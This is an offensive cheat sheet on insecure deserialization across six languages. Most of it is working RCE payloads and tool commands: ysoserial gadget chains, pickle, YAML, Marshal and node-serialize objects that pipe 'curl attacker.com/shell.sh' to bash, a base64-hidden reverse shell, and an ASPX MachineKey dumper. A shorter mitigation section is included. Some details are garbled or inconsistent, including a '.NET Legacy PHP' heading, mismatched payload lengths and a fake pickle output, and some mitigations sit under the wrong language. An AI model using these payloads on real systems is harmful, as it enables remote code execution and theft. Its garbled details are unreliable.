## Overview

**Serialization** converts complex data structures (objects, fields) into a flat byte stream for storage or transmission. **Deserialization** reconstructs the original object from that stream.

**Insecure Deserialization** occurs when an application deserializes untrusted data without proper validation. Attackers can inject malicious serialized objects that trigger code execution, bypass authentication, cause DoS, or abuse application logic during reconstruction.

**Key Risk:** Magic methods, callbacks, or gadget chains execute **during** deserialization—before the app even uses the object. Attackers control the object graph, class types, and property values.

---

## Detection & Fingerprinting

### Black Box Indicators

|Language|Magic Bytes (Hex)|Magic Bytes (Base64)|Other Signatures|
|---|---|---|---|
|**Java**|`AC ED 00 05`|`rO0`|`H4sIAAAAAAAAAJ` (gzip), `%C2%AC%C3%AD%00%05` (URL-encoded), Header: `application/x-java-serialized-object`, `.faces` files with `faces.ViewState`|
|**.NET**|—|`AAEAAAD/////`|`TypeObject`, `$type`, `__VIEWSTATE` parameter|
|**PHP**|—|—|Patterns like `O:4:"test":1:{s:1:"s";}`, `a:2:{i:0;s:3:"its";}`|
|**Python**|—|Base64 with `p0`, `p1`, `g0`, `g1`|Pickle/YAML streams|
|**Ruby**|—|—|`\x04\bo:\vPerson\x06:\n@name` patterns|
|**Node.js**|—|—|`__js_function`, `_$$ND_FUNC$$_` flags|

### White Box Indicators

**Java:**

- Classes implementing `Serializable`
- `ObjectInputStream`, `readObject()`, `readUnshared()`
- `XMLDecoder` with user parameters
- `XStream.fromXML()` (≤ v1.46)

**.NET:**

- `TypeNameHandling` != `None`
- `JavaScriptTypeResolver` usage
- `BinaryFormatter`, `NetDataContractSerializer`

**PHP:**

- `unserialize()` on user input
- Magic methods: `__wakeup()`, `__destruct()`, `__toString()`, `__unserialize()`

**Python:**

- `pickle.loads()`, `yaml.load()` without `Loader=SafeLoader`
- `jsonpickle.decode()`

**Ruby:**

- `Marshal.load()` on untrusted data
- `.send()` with user-controlled method names

**Node.js:**

- `eval()` on deserialized strings
- `node-serialize`, `funcster`, `serialize-javascript` libraries

---

## Exploitation Methods

### PHP Deserialization → RCE

**Attack Flow:**

1. Identify `unserialize()` accepting user input
2. Find gadget classes with dangerous magic methods
3. Craft serialized payload triggering RCE via gadget chain

**Step-by-Step:**

```php
// Vulnerable Code
$data = unserialize($_GET['data']);

// Gadget Class Example
class Evil {
    public $cmd;
    function __destruct() {
        system($this->cmd); // RCE on object destruction
    }
}

// Exploit Payload
<?php
$payload = new Evil();
$payload->cmd = "curl http://attacker.com/shell.sh | bash";
echo serialize($payload);
// Output: O:4:"Evil":1:{s:3:"cmd";s:42:"curl http://attacker.com/shell.sh | bash";}
?>
```

**Encoded Payload:**

```
O:4:"Evil":1:{s:3:"cmd";s:42:"curl http://attacker.com/shell.sh | bash";}
```

**Bypassing `allowed_classes` (PHP ≥7.0):**

- If code uses `unserialize($data, ['allowed_classes' => false])`, object instantiation is blocked
- Legacy PHP <7.0 lacks this protection → always exploitable
- **Real Example (CVE-2025-52709):** Everest Forms plugin forgot PHP <7.1 branch:

```php
function evf_maybe_unserialize($data, $options = []) {
    if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
        return @unserialize(trim($data), ['allowed_classes' => false]); // SAFE
    }
    return @unserialize(trim($data)); // VULNERABLE
}
```

**Phar Deserialization (LFI Bypass):**

- Functions like `file_get_contents()`, `file_exists()` trigger deserialization when reading `phar://` URIs
- Upload malicious `.phar` file, trigger via `file_get_contents("phar://uploads/evil.phar")`

---

### Java Deserialization → RCE

**Attack Flow:**

1. Detect Java serialized objects (`AC ED 00 05`, `rO0`, `application/x-java-serialized-object`)
2. Identify vulnerable libraries (Commons-Collections, Spring, Groovy)
3. Generate gadget chain with **ysoserial**
4. Inject payload into deserialization sink

**Step-by-Step with ysoserial:**

```bash
# 1. URLDNS Detection (No RCE, just DNS callback)
java -jar ysoserial.jar URLDNS "http://test.burpcollaborator.net" > payload.bin

# 2. RCE Payloads (Commons-Collections)
# Windows
java -jar ysoserial.jar CommonsCollections5 "cmd /c ping -n 5 attacker.com" | base64 -w0

# Linux
java -jar ysoserial.jar CommonsCollections4 "curl http://attacker.com/shell.sh | bash" | base64 -w0

# 3. Encoded Reverse Shell
echo -n "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=
java -jar ysoserial.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" | base64 -w0
```

**GadgetProbe (Library Detection):**

- Burp extension that fingerprints Java libraries via DNS callbacks
- Identifies which gadgets exist before exploitation

**Bypassing SignedObject Protections (CVE-2025-10035 Pattern):**

```java
// Vulnerable Pattern
SignedObject so = deserialize(userInput);
if (!so.verify(publicKey, signature)) {
    throw new Exception("Invalid signature!");
}
Object inner = so.getObject(); // RCE gadget inside
```

- **Bypass:** Pre-auth error handlers that mint session tokens
- **Exploit:** Crash JSF page → error handler generates token → reuse token to reach signed sink

---

### .NET Deserialization → RCE

**Attack Flow:**

1. Detect `AAEAAAD/////`, `TypeNameHandling.Auto`, `__VIEWSTATE`
2. Identify formatter (`BinaryFormatter`, `Json.NET`, `LosFormatter`)
3. Generate payload with **ysoserial.net**
4. Inject into deserialization endpoint

**Step-by-Step with ysoserial.net:**

```bash
# 1. ObjectDataProvider Gadget (Basic RCE)
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -enc <BASE64_COMMAND>" -o base64

# 2. TypeConfuseDelegate (BinaryFormatter)
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64

# 3. ViewState Exploitation (Needs MachineKey)
# Step 1: Find MachineKey with Blacklist3r
AspDotNetWrapper.exe --keypath keys.txt --encrypteddata <VIEWSTATE> --modifier <VIEWSTATEGENERATOR>

# Step 2: Generate Payload
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" \
  --validationkey=<KEY> --validationalg=SHA1 \
  --decryptionkey=<KEY> --decryptionalg=AES \
  --generator=<VIEWSTATEGENERATOR> --minify -o base64
```

**ViewState Attack Scenarios:**

|Test Case|EnableViewStateMac|ViewStateEncryptionMode|Exploit Method|
|---|---|---|---|
|1|false|false|Direct ysoserial.net payload (no validation)|
|2|true|false|Blacklist3r to find key → ysoserial.net with key|
|3|true|true (.NET <4.5)|Remove `__VIEWSTATEENCRYPTED` param → use case 2|
|4|Any (.NET ≥4.5)|Any|Requires MachineKey discovery|

**Dumping MachineKeys via ASPX Upload:**

```csharp
<%@ Import Namespace="System.Web.Configuration" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
public void Page_Load(object sender, EventArgs e) {
    var asm = Assembly.Load("System.Web");
    var sect = asm.GetType("System.Web.Configuration.MachineKeySection");
    var m = sect.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
    var cfg = (MachineKeySection)m.Invoke(null, null);
    Response.Write($"{cfg.ValidationKey}|{cfg.DecryptionKey}");
}
</script>
```

---

### Python Deserialization → RCE

**Pickle RCE:**

```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl http://attacker.com/pwn.sh | bash",))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload)
# Decode: cHVibGljIFJDRSBvbiBwaWNrbGUubG9hZCgp
```

**YAML RCE (PyYAML):**

```python
import yaml

# Vulnerable (UnsafeLoader)
data = b'!!python/object/apply:subprocess.Popen [["curl","http://attacker.com"]]'
yaml.load(data, Loader=yaml.UnsafeLoader)

# Safe (SafeLoader blocks object deserialization)
yaml.load(data, Loader=yaml.SafeLoader) # Throws error
```

**YAML Payload Generator:**

```bash
pip install badsecrets
python3 peas.py
# Select "PyYAML" → Enter command → Get payload
```

---

### Ruby Deserialization → RCE

**Marshal RCE (Ruby 2.x Universal Chain):**

```ruby
# Exploit
class Gem::StubSpecification
  def initialize; end
end

stub = Gem::StubSpecification.new
stub.instance_variable_set(:@loaded_from, "|curl http://attacker.com/pwn 1>&2")

payload = Marshal.dump(stub)
puts Base64.encode64(payload)

# Trigger
Marshal.load(Base64.decode64(payload)) # RCE on load
```

**Ruby `.send()` RCE:**

```ruby
# If user input reaches .send()
user_input = params[:method] # Attacker controls

# Vulnerable
SomeObject.send(user_input, attacker_controlled_arg) # Can call ANY method

# Exploit: Call eval with Ruby code
SomeObject.send('eval', 'system("id")') # RCE
```

---

### Node.js Deserialization → RCE

**node-serialize Exploit:**

```javascript
var serialize = require('node-serialize');

// Payload with IIFE (Immediately Invoked Function Expression)
var payload = {
  "rce": "_$$ND_FUNC$$_function(){ require('child_process').exec('curl http://attacker.com/shell.sh | bash') }()"
};

serialize.unserialize(payload); // RCE on unserialize
```

**funcster Exploit:**

```javascript
var funcster = require('funcster');

// Exploit: Restore global context
var payload = {
  "__js_function": "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')"
};

funcster.deepDeserialize(payload); // RCE
```

---

## Bypasses & Advanced Techniques

### PHP Autoload Gadget Loading

- Abuse `spl_autoload_register()` to load arbitrary `.php` files via class names
- Example: Deserialize `O:28:"www_frontend_vendor_autoload":0:{}` → loads `/www/frontend/vendor/autoload.php`
- Chain with phpggc gadgets from other webapps in same container

### Java Pre-Auth via Error Handlers

- Crash JSF/Faces page with invalid `ViewState` → error handler generates session token
- Reuse token to reach authenticated deserialization sink (CVE-2025-10035 pattern)

### .NET Legacy PHP <7.0 Bypass

- ASP.NET <4.5 accepts unencrypted `__VIEWSTATE` even when encryption is enabled
- Remove `__VIEWSTATEENCRYPTED` parameter → bypass encryption check

### Python Class Pollution

- Pollute `__class__.__init__.__globals__` to overwrite global functions
- Example: Overwrite `os.system` → hijack all command executions

### Ruby Bootstrap Caching RCE

- Write malicious Bootsnap cache file to `tmp/cache/bootsnap/`
- Trigger Rails restart → cache loads → RCE

---

## Payloads (Top 10 Modern Robust)

### 1. Java URLDNS (Detection)

```bash
java -jar ysoserial.jar URLDNS "http://test.burpcollaborator.net" | base64 -w0
```

### 2. Java CommonsCollections4 (Linux RCE)

```bash
java -jar ysoserial.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" | base64 -w0
```

### 3. .NET ObjectDataProvider (Windows RCE)

```bash
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -enc <BASE64_CMD>" -o base64
```

### 4. .NET ViewState (With MachineKey)

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" \
  --validationkey=<KEY> --validationalg=SHA1 --generator=<GEN> --minify -o base64
```

### 5. PHP Magic Method (Basic RCE)

```php
O:4:"Evil":1:{s:3:"cmd";s:36:"curl http://attacker.com/shell.sh | bash";}
```

### 6. Python Pickle (Universal RCE)

```python
import pickle, os, base64
class X:
    def __reduce__(self): return (os.system, ("curl http://attacker.com/pwn.sh | bash",))
print(base64.b64encode(pickle.dumps(X())))
```

### 7. Python YAML (PyYAML RCE)

```yaml
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - curl
  - http://attacker.com/pwn.sh
```

### 8. Ruby Marshal (Universal Chain)

```ruby
class Gem::StubSpecification; def initialize; end; end
stub = Gem::StubSpecification.new
stub.instance_variable_set(:@loaded_from, "|curl http://attacker.com 1>&2")
puts Base64.encode64(Marshal.dump(stub))
```

### 9. Node.js node-serialize (IIFE RCE)

```json
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('curl http://attacker.com/shell.sh | bash') }()"}
```

### 10. Java Sleep (Blind Detection)

```bash
java -jar ysoserial.jar CommonsCollections5 "timeout 10" | base64 -w0
```

---

## Higher Impact Scenarios

### 1. Pre-Auth RCE via Error Handlers

- **Target:** ASP.NET apps with ViewState + error handlers
- **Impact:** Turn authenticated deserialization → unauthenticated RCE
- **Example:** CVE-2025-10035 (GoAnywhere MFT)

### 2. Cross-App Gadget Loading

- **Target:** Shared hosting/containers with multiple apps
- **Impact:** Exploit App A using gadgets from App B's libraries
- **Method:** Autoload composer from other app → load vulnerable library

### 3. MachineKey Extraction → Mass Exploitation

- **Target:** ASP.NET apps with publicly leaked keys (GitHub, pastebins)
- **Impact:** Generate valid ViewState gadgets for any victim
- **Tool:** Blacklist3r, badsecrets

### 4. JMS Message Queue Poisoning

- **Target:** Java Message Service consumers (ActiveMQ, RabbitMQ)
- **Impact:** All queue subscribers execute payload
- **Tool:** JMET

### 5. JNDI Injection via Deserialization

- **Target:** Java apps with gadgets referencing JNDI lookups
- **Impact:** Remote class loading → RCE
- **Payloads:** CommonsCollections with JNDI references

---

## Mitigations

### General

✅ **Never deserialize untrusted data**  
✅ Use safe formats (JSON, Protobuf) without type metadata  
✅ Implement integrity checks (HMAC, digital signatures)  
✅ Apply principle of least privilege (sandboxing)

### Language-Specific

**Java:**

- Enable JEP 290 serialization filters:

```bash
-Djdk.serialFilter="com.example.dto.*;java.base/*;!*"
```

- Avoid `ObjectInputStream` → use `DataContractSerializer`
- Scan for gadgets with `gadget-inspector`

**.NET:**

- Set `TypeNameHandling = TypeNameHandling.None` (Json.NET)
- Avoid `BinaryFormatter` → use `DataContractSerializer`
- Use `allowed_classes` with `SerializationBinder`
- Rotate `MachineKey` values regularly

**PHP:**

- Declare sensitive properties as `transient`
- Implement `__wakeup()` that throws exceptions
- Use `allowed_classes` parameter (PHP ≥7.0):

```php
unserialize($data, ['allowed_classes' => [SafeClass::class]]);
```

**Python:**

- Use `yaml.safe_load()` instead of `yaml.load()`
- Avoid `pickle` for untrusted data → use JSON
- Implement custom `Unpickler` with restricted imports

**Ruby:**

- Use `Psych.safe_load()` for YAML
- Avoid `Marshal.load()` on user input
- Filter method names before `.send()`

**Node.js:**

- Never use `eval()` on deserialized strings
- Avoid libraries with `_$$ND_FUNC$$_` patterns
- Use `JSON.parse()` for simple data (no code execution)

---

## Tools & Resources

### Exploit Generation

- **ysoserial** (Java): https://github.com/frohoff/ysoserial
- **ysoserial.net** (.NET): https://github.com/pwntester/ysoserial.net
- **phpggc** (PHP): https://github.com/ambionics/phpggc
- **marshalsec** (Java JSON/XML): https://github.com/mbechler/marshalsec
- **JMET** (JMS): https://github.com/matthiaskaiser/jmet
- **peas.py** (Python multi-format): https://github.com/j0lt-github/python-deserialization-attack-payload-generator

### Detection & Analysis

- **GadgetProbe** (Burp, Java): Fingerprint libraries via DNS
- **Java Deserialization Scanner** (Burp): Auto-exploit ysoserial gadgets
- **Freddy** (Burp): Detect JSON/YAML/ObjectInputStream vulns
- **Blacklist3r** (.NET MachineKey): Bruteforce ASP.NET keys
- **badsecrets** (Python): Identify known keys/secrets
- **SerializationDumper** (Java): Human-readable serialized object viewer

### Gadget Discovery

- **gadget-inspector** (Java): Automated gadget chain discovery
- **CodeQL** (Ruby): Unsafe deserialization queries

---

## Quick Reference Cheat Sheet

```bash
# === DETECTION ===
# Java
grep -r "ObjectInputStream\|readObject\|XMLDecoder" .
curl -H "Content-Type: application/x-java-serialized-object" <URL>

# .NET
grep -r "TypeNameHandling\|BinaryFormatter\|__VIEWSTATE" .

# PHP
grep -r "unserialize" . | grep '$_'

# Python
grep -r "pickle.loads\|yaml.load" . | grep -v "SafeLoader"

# === EXPLOITATION ===
# Java RCE
java -jar ysoserial.jar CommonsCollections4 "curl http://attacker.com" | base64

# .NET RCE
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe" -o base64

# PHP RCE
echo 'O:4:"Evil":1:{s:3:"cmd";s:2:"id";}' | base64

# Python RCE
python3 -c "import pickle,os,base64; class X: __reduce__=lambda s:(os.system,('id',)); print(base64.b64encode(pickle.dumps(X())))"

# === MITIGATION ===
# Java Filter
-Djdk.serialFilter="com.example.*;!*"

# .NET Safe JSON
JsonConvert.DeserializeObject<T>(json, new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.None });

# PHP Safe Unserialize
unserialize($data, ['allowed_classes' => false]);

# Python Safe YAML
yaml.safe_load(data)
```

---

**🎯 Pro Tips for Bug Bounty:**

1. **Always test URLDNS first** (non-invasive detection)
2. **Chain with LFI** (phar://, autoload gadgets)
3. **Check error handlers** for pre-auth paths
4. **Scan for leaked MachineKeys** (GitHub, Shodan)
5. **Test all formatters** (JSON, XML, Binary) - one might be vulnerable
6. **Look for version mismatches** (old libraries = known gadgets)
7. **Fuzz input** - sometimes deserialization happens in unexpected places (webhooks, caching, logging)